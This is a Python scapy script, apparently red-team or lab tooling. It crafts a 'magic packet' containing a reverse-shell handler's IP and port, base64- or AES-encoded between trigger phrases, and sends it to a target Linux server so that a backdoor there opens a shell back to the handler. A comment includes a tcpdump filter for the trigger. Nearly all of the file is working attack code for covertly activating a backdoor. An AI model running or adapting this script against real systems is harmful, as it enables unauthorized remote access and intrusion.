#! /usr/bin/env python
# References: https://santandergto.com/en/guide-using-scapy-with-python/

import random, datetime, argparse, base64
from Crypto.Cipher import AES
from Crypto import Random
from scapy.all import *

# arguments
parser = argparse.ArgumentParser()
parser.add_argument("--handler_ip", help="IP address of the reverse shell handler", default="127.0.0.1", required=False)
parser.add_argument("--handler_port", help="Port of the reverse shell handler", default="6792", required=False)

parser.add_argument("--target_ip", help="IP address of the target linux server", default="10.0.2.8", required=False)
parser.add_argument("--target_port", help="Port of the target linux service", default="89", required=False)
parser.add_argument("--payload_type", help="The type of payload to use, [base64 or AES]", default="base64", required=False)
args = parser.parse_args()


# Reverse shell Info
hander_ip = args.handler_ip
hander_port = args.handler_port

# prepended to the payload
identifier = [
    'i love unicorns!', # 69206c6f 76652075 6e69636f 726e7321
    'i love gnarwalls', # 69206c6f 76652067 6e617277 616c6c73

]

# appended to the payload
secondary_identifier = [
    'magical!', # 6d616769 63616c21
    'mythical', # 6d797468 6963616c
]

# finding your magic packet
# sudo tcpdump -s 0 -nnXi eth0 'tcp and (tcp[20:4]=0x69206c6f) and (tcp[24:2]=0x7665) and (tcp[26:1]=0x20) and (tcp[27:1]=0x75 or tcp[27:1]=0x67) and (tcp[28:4]=0x6e69636f or tcp[28:4]=0x6e617277) and (tcp[32:4]=0x726e7321 or tcp[32:4]=0x616c6c73) and (tcp[124:4]=0x6d616769 or tcp[124:4]=0x6d797468) and (tcp[128:4]=0x63616c21 or tcp[128:4]=0x6963616c)'

selected_identifier = random.choice(identifier) # select random string from list of identifiers
selected_secondary_identifier = random.choice(secondary_identifier) # select random string from list of secondary identifiers

# 
# [build_encyption_key] Takes the indicator string and builds the AES encryption key
# paramter(s): (string) indicator - The prepended/randomly chosen port knocking phrase
# return(s): (string) - a string containing the encrpytion key
def build_encyption_key(indicator):
    # get current time
    d = datetime.now()

    string = indicator.replace(" ", "") # strip spaces
    string = string[:-2] # remove last letter from string to meet AES key length requirements
    string += d.strftime("%m") # append month to the string
    string += d.strftime("%d") # append day to the string

    return string

# [encrypt_payload] Builds an encrypted payload using a specified key using AES-128 CBC
# paramter(s): (string) key - AES128 encryption key, (string) ip - handler ip, (string) port - handler port
# return(s): (string) - base64 encoded payload
def encrypt_payload(key, ip, port):
    # convert key to bytes
    key = bytes(key, 'utf-8')
    # check length, and pad the payload to get two exact blocks
    required_length = 34
    actual_len = len(ip) + len(port) + 1

    # create padding for CBC block
    padding = 'a' * (required_length - actual_len)

    # combine the payload with padding
    payload = "{0}:{1}{2}".format(ip, port, padding)

    # payload to bytes
    payload = bytes(payload, 'utf-8')

    # b64 encode payload
    payload = base64.b64encode(payload)

    # create random string for iv
    iv = Random.new().read(AES.block_size)
    # create the cipher
    cipher = AES.new(key, AES.MODE_CBC, iv)

    # return the base64/AES encrypted payload
    # format is BASE64(IV + AES(PAYLOAD))
    # returned length should be 88
    encrypted = cipher.encrypt(payload)

    # compine the iv with the encrypted payload
    combine = iv + encrypted

    # final b64 encoding
    b64encode = base64.b64encode(combine)

    return b64encode

# [base64_payload] Builds a base64 encoded payload
# paramter(s): (string) ip - handler ip, (string) port - handler port
# return(s): (string) - base64 encoded payload
def base64_payload(ip, port):
    # check length, and pad the payload to get 88 charracter payload length
    required_length = 64
    actual_len = len(ip) + len(port) + 1

    # create padding
    padding = 'a' * (required_length - actual_len)

    # combine the payload with padding
    payload = "{0}:{1}{2}".format(ip, port, padding)
    
    # payload to bytes
    payload = bytes(payload, 'utf-8')

    # return b64 encoded payload
    return base64.b64encode(payload)



# convert encrypted payload to a string
# encrypted = encrypted.decode("utf-8") 

if args.payload_type == 'AES':
    # create the encrypted payload
    payload = encrypt_payload(
        build_encyption_key(selected_identifier),   # create the encryption key with the basic algorithm
        args.handler_ip,                            # pass in the reverse shell handler IP
        args.handler_port                           # pass in the reverse shell handler port
        )
elif args.payload_type == 'base64':
    # base64 encode the payload
    payload = base64_payload(
        args.handler_ip,                            # pass in the reverse shell handler IP
        args.handler_port                           # pass in the reverse shell handler port
    )


# convert base64 encoded payload to a string
payload = payload.decode("utf-8") 

# The string we are triggering on
payload = selected_identifier + payload + selected_secondary_identifier

# Create a packet to send
ip_layer = IP(dst=args.target_ip) # change this ip address to the target host
protocal_layer = TCP(dport=int(args.target_port)) # change this to the target port (if needed)

# Show what we are sending
# print(payload)

packet = Ether(dst='12:34:56:12:34:56')/ip_layer/protocal_layer/payload

# packet = Ether()/ip_layer/protocal_layer/'i love unicorns!NzQgNjggNjkgNzMgNjkgNzMgNjEgNzQgNjUgNzMgNzQgNjggNmYgNzcgNjEgNjIgNmYgNzUgNzQgNjEgNmMgNjU=magical!'

# packet.show() # provides fields and values
# scapy.utils.chexdump(packet) # provides hex dump so you can caluclate the offsets

# Send the packet
sendp(packet, iface="eth0")
